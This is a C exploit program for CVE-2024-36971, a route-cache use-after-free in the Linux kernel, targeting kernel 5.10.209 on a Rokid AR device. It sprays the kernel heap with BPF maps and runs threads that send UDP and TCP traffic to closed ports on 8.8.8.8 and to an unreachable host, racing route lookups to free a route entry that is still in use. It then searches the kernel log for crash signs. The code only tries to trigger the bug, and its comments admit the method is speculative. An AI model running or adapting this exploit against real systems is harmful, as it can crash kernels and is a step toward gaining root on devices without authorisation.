/*
 * CVE-2024-36971 - Route Cache UAF with Real Network Interface
 * Target: Kernel 5.10.209 Rokid AR (WiFi Connected)
 *
 * KEY INSIGHT: With real network interface (wlan0), we can potentially
 * trigger dst->obsolete via ICMP errors from external hosts!
 *
 * Strategy:
 * 1. Create route to external host via wlan0
 * 2. Trigger ICMP errors (Host Unreachable, Port Unreachable, etc.)
 * 3. These errors may set dst->obsolete
 * 4. Race ipv4_negative_advice() to free dst while still in use
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <linux/rtnetlink.h>
#include <fcntl.h>
#include <poll.h>
#include <signal.h>
#include <sys/syscall.h>
#include <linux/bpf.h>

#define NUM_SPRAY_OBJECTS 50000
#define NUM_RACE_THREADS 4
#define OBJECT_SIZE 192 /* Target size for DST slab */

static volatile int g_running = 1;
static volatile unsigned long g_trigger_count = 0;
static volatile unsigned long g_icmp_errors = 0;
static int g_bpf_maps[NUM_SPRAY_OBJECTS];
static int g_bpf_map_count = 0;

/* Target: IP that will generate ICMP errors */
#define TARGET_IP "8.8.8.8"           /* Google DNS - will respond */
#define UNREACHABLE_IP "10.255.255.1" /* Non-routable, will get ICMP error */
#define CLOSED_PORT 65534             /* Unlikely to be open */

int bpf_syscall(int cmd, union bpf_attr *attr, unsigned int size)
{
    return syscall(__NR_bpf, cmd, attr, size);
}

int create_bpf_map(int value_size)
{
    union bpf_attr attr = {0};
    attr.map_type = BPF_MAP_TYPE_HASH;
    attr.key_size = 4;
    attr.value_size = value_size;
    attr.max_entries = 1;
    return bpf_syscall(BPF_MAP_CREATE, &attr, sizeof(attr));
}

void spray_bpf_objects(int count, int size)
{
    printf("[*] Spraying %d BPF map objects (%d bytes each)\n", count, size);

    for (int i = 0; i < count && i < NUM_SPRAY_OBJECTS; i++)
    {
        int fd = create_bpf_map(size);
        if (fd >= 0)
        {
            g_bpf_maps[g_bpf_map_count++] = fd;
        }
        if (i % 10000 == 0)
        {
            printf("    Sprayed %d objects...\n", i);
        }
    }
    printf("[+] Sprayed %d BPF objects\n", g_bpf_map_count);
}

void cleanup_bpf_spray(void)
{
    for (int i = 0; i < g_bpf_map_count; i++)
    {
        close(g_bpf_maps[i]);
    }
    g_bpf_map_count = 0;
}

/*
 * Thread: UDP to closed port - triggers ICMP Port Unreachable
 */
void *udp_closed_port_thread(void *arg)
{
    int tid = *(int *)arg;

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(CLOSED_PORT);
    inet_pton(AF_INET, TARGET_IP, &addr.sin_addr);

    while (g_running)
    {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0)
            continue;

        /* Enable ICMP error reception */
        int val = 1;
        setsockopt(sock, IPPROTO_IP, IP_RECVERR, &val, sizeof(val));

        /* Set non-blocking */
        int flags = fcntl(sock, F_GETFL, 0);
        fcntl(sock, F_SETFL, flags | O_NONBLOCK);

        /* Send UDP to closed port */
        char buf[64] = "probe";
        if (sendto(sock, buf, sizeof(buf), 0,
                   (struct sockaddr *)&addr, sizeof(addr)) > 0)
        {
            g_trigger_count++;
        }

        /* Try to receive ICMP error */
        struct pollfd pfd = {sock, POLLERR, 0};
        if (poll(&pfd, 1, 10) > 0)
        {
            if (pfd.revents & POLLERR)
            {
                g_icmp_errors++;
                /* This is where dst might become obsolete! */
            }
        }

        close(sock);

        if (g_trigger_count % 10000 == 0 && tid == 0)
        {
            printf("    Triggers: %lu, ICMP errors: %lu\n",
                   g_trigger_count, g_icmp_errors);
        }
    }

    return NULL;
}

/*
 * Thread: TCP connect to closed port - RST triggers error path
 */
void *tcp_connect_thread(void *arg)
{
    int tid = *(int *)arg;

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(CLOSED_PORT);
    inet_pton(AF_INET, TARGET_IP, &addr.sin_addr);

    while (g_running)
    {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0)
            continue;

        /* Non-blocking connect */
        int flags = fcntl(sock, F_GETFL, 0);
        fcntl(sock, F_SETFL, flags | O_NONBLOCK);

        connect(sock, (struct sockaddr *)&addr, sizeof(addr));
        g_trigger_count++;

        /* Wait briefly for RST */
        struct pollfd pfd = {sock, POLLERR | POLLHUP, 0};
        if (poll(&pfd, 1, 5) > 0)
        {
            if (pfd.revents & (POLLERR | POLLHUP))
            {
                g_icmp_errors++;
            }
        }

        close(sock);
    }

    return NULL;
}

/*
 * Thread: Connect to unreachable host - triggers ICMP Host Unreachable
 */
void *unreachable_host_thread(void *arg)
{
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(80);
    inet_pton(AF_INET, UNREACHABLE_IP, &addr.sin_addr);

    while (g_running)
    {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0)
            continue;

        int val = 1;
        setsockopt(sock, IPPROTO_IP, IP_RECVERR, &val, sizeof(val));

        int flags = fcntl(sock, F_GETFL, 0);
        fcntl(sock, F_SETFL, flags | O_NONBLOCK);

        char buf[32] = "test";
        sendto(sock, buf, sizeof(buf), 0,
               (struct sockaddr *)&addr, sizeof(addr));
        g_trigger_count++;

        struct pollfd pfd = {sock, POLLERR, 0};
        if (poll(&pfd, 1, 50) > 0)
        {
            if (pfd.revents & POLLERR)
            {
                g_icmp_errors++;
            }
        }

        close(sock);
    }

    return NULL;
}

/*
 * Thread: Rapid route lookup to race with obsolete
 */
void *route_lookup_thread(void *arg)
{
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(80);
    inet_pton(AF_INET, TARGET_IP, &addr.sin_addr);

    while (g_running)
    {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0)
            continue;

        /* Just connect (does route lookup) */
        connect(sock, (struct sockaddr *)&addr, sizeof(addr));

        /* Immediately close (might race with route cache update) */
        close(sock);

        g_trigger_count++;
    }

    return NULL;
}

void signal_handler(int sig)
{
    printf("\n[!] Caught signal %d, stopping...\n", sig);
    g_running = 0;
}

int main(int argc, char *argv[])
{
    int duration = 30;

    if (argc > 1)
    {
        duration = atoi(argv[1]);
    }

    setbuf(stdout, NULL);
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);

    printf("============================================\n");
    printf("CVE-2024-36971 - Route Cache UAF (WiFi Mode)\n");
    printf("Target: Kernel 5.10.209 Rokid AR\n");
    printf("Duration: %d seconds\n", duration);
    printf("============================================\n");

    /* Verify network connectivity */
    printf("\n[*] Testing network connectivity...\n");
    int test_sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (test_sock < 0)
    {
        perror("socket");
        return 1;
    }

    struct sockaddr_in test_addr;
    memset(&test_addr, 0, sizeof(test_addr));
    test_addr.sin_family = AF_INET;
    test_addr.sin_port = htons(53);
    inet_pton(AF_INET, TARGET_IP, &test_addr.sin_addr);

    if (connect(test_sock, (struct sockaddr *)&test_addr, sizeof(test_addr)) < 0)
    {
        perror("connect");
        printf("[!] Cannot reach target. Is WiFi connected?\n");
        close(test_sock);
        return 1;
    }
    close(test_sock);
    printf("[+] Network OK - can reach %s\n", TARGET_IP);

    /* Phase 1: Spray BPF objects */
    printf("\n[*] Phase 1: BPF Heap Spray\n");
    spray_bpf_objects(30000, OBJECT_SIZE);

    /* Phase 2: Start race threads */
    printf("\n[*] Phase 2: Starting race threads\n");

    pthread_t threads[8];
    int tids[8] = {0, 1, 2, 3, 4, 5, 6, 7};
    int thread_count = 0;

    /* UDP threads */
    for (int i = 0; i < 2; i++)
    {
        pthread_create(&threads[thread_count], NULL, udp_closed_port_thread, &tids[thread_count]);
        thread_count++;
    }

    /* TCP threads */
    for (int i = 0; i < 2; i++)
    {
        pthread_create(&threads[thread_count], NULL, tcp_connect_thread, &tids[thread_count]);
        thread_count++;
    }

    /* Unreachable host thread */
    pthread_create(&threads[thread_count], NULL, unreachable_host_thread, &tids[thread_count]);
    thread_count++;

    /* Route lookup threads */
    for (int i = 0; i < 3; i++)
    {
        pthread_create(&threads[thread_count], NULL, route_lookup_thread, &tids[thread_count]);
        thread_count++;
    }

    printf("[*] %d threads running, waiting %d seconds...\n", thread_count, duration);

    /* Run for specified duration */
    for (int i = 0; i < duration && g_running; i++)
    {
        sleep(1);
        if (i % 5 == 0)
        {
            printf("[%2d/%d] Triggers: %lu, ICMP errors: %lu\n",
                   i, duration, g_trigger_count, g_icmp_errors);
        }
    }

    /* Stop threads */
    g_running = 0;
    printf("\n[*] Stopping threads...\n");

    for (int i = 0; i < thread_count; i++)
    {
        pthread_join(threads[i], NULL);
    }

    /* Results */
    printf("\n============================================\n");
    printf("Results:\n");
    printf("  Total triggers: %lu\n", g_trigger_count);
    printf("  ICMP errors received: %lu\n", g_icmp_errors);
    printf("  BPF spray objects: %d\n", g_bpf_map_count);
    printf("============================================\n");

    /* Check kernel log for crashes */
    printf("\n[*] Checking dmesg for crashes...\n");
    FILE *f = popen("dmesg | grep -iE 'panic|BUG|UAF|KASAN|use.after.free|slab|double.free' | tail -10 2>/dev/null", "r");
    if (f)
    {
        char line[256];
        int found = 0;
        while (fgets(line, sizeof(line), f))
        {
            printf("  %s", line);
            found = 1;
        }
        pclose(f);
        if (!found)
        {
            printf("  No crash indicators found\n");
        }
    }

    /* Cleanup */
    cleanup_bpf_spray();

    return 0;
}
